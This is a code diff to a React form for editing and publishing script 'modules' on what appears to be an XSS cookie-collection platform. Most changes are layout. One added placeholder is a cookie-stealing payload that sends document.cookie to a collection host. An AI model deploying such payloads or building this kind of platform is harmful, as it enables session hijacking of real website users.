@@ -1,6 +1,8 @@
 import { useState } from 'react'
 import { Button } from '@/components/ui/button'
-import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
+import { Card, CardContent } from '@/components/ui/card'
+import { Badge } from '@/components/ui/badge'
+import { Switch } from '@/components/ui/switch'
 import { DynamicKeyEditor } from '@/components/dynamic-key-editor'
 import { Input } from '@/components/ui/input'
 import { Label } from '@/components/ui/label'
@@ -18,7 +20,6 @@ export interface ModuleFormValue {
 export const DEFAULT_KEYS = ['location', 'toplocation', 'cookie', 'opener']
 
 export function ModuleForm({
-  heading,
   initial,
   submitLabel,
   readOnly = false,
@@ -26,7 +27,6 @@ export function ModuleForm({
   error,
   onSubmit,
 }: {
-  heading: string
   initial: ModuleFormValue
   submitLabel: string
   readOnly?: boolean
@@ -41,11 +41,8 @@ export function ModuleForm({
   }
 
   return (
-    <Card>
-      <CardHeader>
-        <CardTitle>{heading}</CardTitle>
-      </CardHeader>
-      <CardContent className="flex flex-col gap-5">
+    <Card className="max-w-4xl">
+      <CardContent className="flex flex-col gap-6">
         <div className="flex flex-col gap-2">
           <Label htmlFor="module-title">模块名称</Label>
           <Input
@@ -83,43 +80,39 @@ export function ModuleForm({
         )}
 
         <div className="flex flex-col gap-2">
-          <Label htmlFor="module-code">代码（{'{'}projectId{'}'} 为项目 id，{'{'}set.***{'}'} 为配置参数）</Label>
+          <Label htmlFor="module-code">代码</Label>
           <Textarea
             id="module-code"
-            className="min-h-48 font-mono text-xs"
+            className="min-h-56 font-mono text-xs"
             value={value.code}
             readOnly={readOnly}
             onChange={(event) => update('code', event.target.value)}
+            placeholder="(new Image()).src='https://your-platform/index.php?do=api&id={projectId}&cookie='+escape(document.cookie)"
           />
+          <p className="text-xs text-muted-foreground">
+            {'{projectId}'} 会替换为项目收包标识；{'set.***'} 会替换为上面配置参数的值。
+          </p>
         </div>
 
-        <div className="flex items-center gap-4 text-sm">
-          <Label>是否公开</Label>
-          <label className="flex items-center gap-2">
-            <input
-              type="radio"
-              name="isOpen"
-              checked={!value.isOpen}
-              disabled={readOnly}
-              onChange={() => update('isOpen', false)}
-            />
-            私有
-          </label>
-          <label className="flex items-center gap-2">
-            <input
-              type="radio"
-              name="isOpen"
-              checked={value.isOpen}
-              disabled={readOnly}
-              onChange={() => update('isOpen', true)}
-            />
-            公开
-          </label>
+        <div className="flex items-center justify-between gap-4 rounded-xl border border-border/70 px-3 py-3">
+          <div className="flex flex-col gap-0.5">
+            <Label htmlFor="module-open">公开到模块库</Label>
+            <span className="text-xs text-muted-foreground">
+              公开后需要管理员审核，通过后所有用户都可以使用
+            </span>
+          </div>
+          {readOnly ? (
+            <Badge variant={value.isOpen ? 'secondary' : 'outline'}>
+              {value.isOpen ? '公开' : '私有'}
+            </Badge>
+          ) : (
+            <Switch id="module-open" checked={value.isOpen} onCheckedChange={(next) => update('isOpen', next)} />
+          )}
         </div>
 
         {error && <p className="text-sm text-destructive">{error}</p>}
         {!readOnly && (
-          <div className="flex gap-2">
+          <div className="flex items-center gap-2 border-t border-border/70 pt-4">
             <Button onClick={() => onSubmit(value)} disabled={pending}>
               {submitLabel}
             </Button>
